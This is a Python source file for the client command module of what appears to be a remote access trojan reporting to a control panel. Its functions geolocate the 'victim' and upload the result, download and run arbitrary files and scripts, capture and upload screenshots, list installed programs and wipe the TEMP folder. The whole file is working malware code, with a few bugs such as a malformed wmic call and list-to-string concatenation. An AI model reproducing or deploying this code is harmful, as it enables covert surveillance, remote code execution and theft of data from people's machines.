import os
import tempfile
import shutil
import requests
import base64
from mss import mss
from HTTPSocket import HTTPSocket

class ClientsCMD:
    def __init__(self, panelURL, machineID):
        self.panelURL = panelURL
        self.machineID = machineID
        self.C = HTTPSocket(str(self.panelURL), str(self.machineID))
        self.tempdir = tempfile.gettempdir()

    def get_device_location(self):
        try:
            ip = requests.get("https://api.ipify.org")
            ip = str(ip.content).split()
            geo_request = requests.get("https://get.geojs.io/v1/ip/geo/" + ip + "json")
            geo_data = geo_request.json()

            path = f"{self.tempdir}\\Location.txt"

            with open(path, "w") as f:
                f.write(f"Accuracy                :{geo_data['accuracy']}           \n")
                f.write(f"Public IPv4             :{geo_data['ip']}                 \n")
                f.write(f"Latitude                :{geo_data['latitude']}           \n")
                f.write(f"Longitude               :{geo_data['longitude']}          \n")
                f.write(f"City                    :{geo_data['city']}               \n")
                f.write(f"Region                  :{geo_data['region']}             \n")
                f.write(f"Country                 :{geo_data['country']}            \n")
                f.write(f"Country Code            :{geo_data['country_code']}       \n")
                f.write(f"Country Code 3          :{geo_data['country_code3']}      \n")
                f.write(f"Continent Code          :{geo_data['continent_code']}     \n")
                f.write(f"Timezone                :{geo_data['timezone']}           \n")
                f.write(f"Organization            :{geo_data['organization']}       \n")
                f.write(f"Organization Name       :{geo_data['organization_name']}  \n")

            publicIP = geo_data['ip']
            latitude = geo_data['latitude']
            longitude = geo_data['longitude']

            self.C.Send(f"UpdateLocation|BN|{publicIP}|BN|{latitude}|BN|{longitude}")
            self.C.Upload(path)
            os.remove(path)
            self.C.Log("Succ", "Geo Latitude and Longitude Retrived Successfully")
            self.C.Send("CleanCommands")

        except Exception as e:
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error ocurred" + str(e))
            print("[Error In ClientsCMD, get_device_location() Function]")
            print(f"[Error] : {e}\n")

    def upload_and_execute_file(self, file_url, file_new_name):
        try:
            if file_new_name == "":
                file_new_name = file_url.split("/")[-1]

            self.C.Download(file_url, self.tempdir + "\\" + file_new_name)

            os.system(str(self.tempdir) + "\\" + file_new_name)

            self.C.Log("Succ", "File is Uploaded and Executed File Successfully")
            self.C.Send("CleanCommands")
        except Exception as e:
            self.C.Send("CleanCommands")
            print("[Error In ClientsCMD, upload_and_execute_file() Function]")
            print(f"[Error] : {e}\n")
            self.C.Log("Fail", "An unexpected error occurred :" + str(e))

    def show_message_box(self, msg, title, iconType, buttonType):
        """
        ButtonType = OkOnly/OkCancel/AbortRetryIgnore/YesNoCancel/YesNO/RetryCancel

        0 = OKOnly
        1 = OKCancel
        2 = AbortRetryIgnore
        3 = YesNoCancel
        4 = YesNo
        5 = RetryCancel

        IconType = None/Critical/Question/Warning/Information/Asterisk
        ==============================================================
        16 = Critical - Critical Message icon
        32 = Question - Warning Query icon
        48 = Warning - Warning Message icon
        64 = Information - Information Message icon
        0  = Blank
        """

        try:
            os.chdir(self.tempdir)

            if buttonType == "OKOnly":
                buttonNumber = 0
            if buttonType == "OKCancel":
                buttonNumber = 1
            if buttonType == "AbortRetryIgnore":
                buttonNumber = 2
            if buttonType == "YesNoCancel":
                buttonNumber = 3
            if buttonType == "YesNo":
                buttonNumber = 4
            if buttonType == "RetryCancel":
                buttonNumber = 5

            if iconType == "None":
                iconNumber = 0
            if iconType == "Critical":
                iconNumber = 16
            if iconType == "Question":
                iconNumber = 32
            if iconType == "Warning":
                iconNumber = 48
            if iconType == "Information":
                iconNumber = 64

            with open("message.vbs", "w") as f:
                f.write("dim message\n")
                f.write(f"message = MsgBox(\"{msg}\", {iconNumber + buttonNumber}, \"{title}\")\n")

            os.system(self.tempdir + "\\message.vbs")

            self.C.Log("Succ", "Message Shown Successfully")
            self.C.Send("CleanCommands")
        except Exception as e:
            self.C.Send("CleanCommands")
            print("[Error In ClientsCMD, show_message_box() Function]")
            print(f"[Error] : {e}\n")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))

    def take_screenshot(self):
        # When Called it saves the sreenshot .png in TEMP
        try:
            os.chdir(self.tempdir)
            filename = str(base64.b64decode(self.machineID.encode()))
            filename = filename.split('\'')[1]

            with mss() as screenshot:
                screenshot.shot(output=f"\\{filename}.png")
            self.C.Upload(str(self.tempdir) + f"\\{filename}.png")
            os.remove(f'{filename}.png')
            self.C.Send("CleanCommands")
            self.C.Log("Succ", "Screenshot Recived Successfully")
        except Exception as e:
            print("[Error In ClientCMD, take_screenshot() Function]")
            print(f"[Error] : {e}\n")
            self.C.Log("Fail", "An unexpected error occcured :" + str(e))

    def get_program_list(self):
        try:
            cmd = f"wmic/output:{self.tempdir}\\ProgramList.txt"
            os.system(cmd)
            self.C.Upload(f"{self.tempdir}\\ProgramList.txt")
            os.remove(f"{self.tempdir}\\ProgramList.txt")

            self.C.Log("Succ", "Retrived Installed Program List from Victim PC")
            self.C.Send("CleanCommands")
        except Exception as e:
            print("[Error In ClientsCMD, get_program_list() Function]")
            print(f"[Error] : {e}\n")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))

    def execute_script(self, script_type, script_name):
        try:
            os.chdir(self.tempdir)
            if script_name[len(script_name)-3:] != "bat" and script_name[len(script_name)-3:] != "vbs" and script_name[len(script_name)-3:] != "ps1":
                script_name = script_name + "." + script_type

            self.C.Download(self.panelURL + "scripts/" + script_name, self.tempdir + "\\" + script_name)

            os.system(self.tempdir + "\\" + script_name)
            os.remove(self.tempdir + "\\" + script_name)

            self.C.Send("DeleteScript|BN|" + script_name)
            self.C.Log("Succ", "Executed Script Successfully")
            self.C.Send("CleanCommands")
        except Exception as e:
            print("[Error In ClientCMD, clear_temp_directory() Function]")
            print(f"[Error] : {e}\n")
            self.C.Log("Fail", "An unexpected error occurred :" + str(e))


    def clear_temp_directory(self):
        try:
            os.chdir(self.tempdir)
            for file in os.listdir():
                if file != "FXSAPIDebugLogFile.txt" and file[:4] != "_MEI":
                    try:
                        shutil.rmtree(file)
                    except:
                        os.remove(file)
            self.C.Log("Succ", "TEMP Directory Cleaned Successfully")
            self.C.Send("CleanCommands")
        except Exception as e:
            print("[Error In ClientCMD, clear_temp_directory() Function]")
            print(f"[Error] : {e}\n")
            self.C.Log("Fail", "An unexpected error occurred :" + str(e))

    def close_connection(self):
        try:
            self.C.Send("Offline")
            self.C.Log("Succ", "Connection closed")
            self.C.Send("CleanCommands")
        except Exception as e:
            print("[Error In ClientsCMD, close_connection()]")
            print(f"[Error] : {e}\n")
            self.C.Log("Fail", "An unexpected error occurred:" + str(e))

    def moveclient(self, newPanelURL):
        print(newPanelURL)
        self.C.Send("CleanCommands")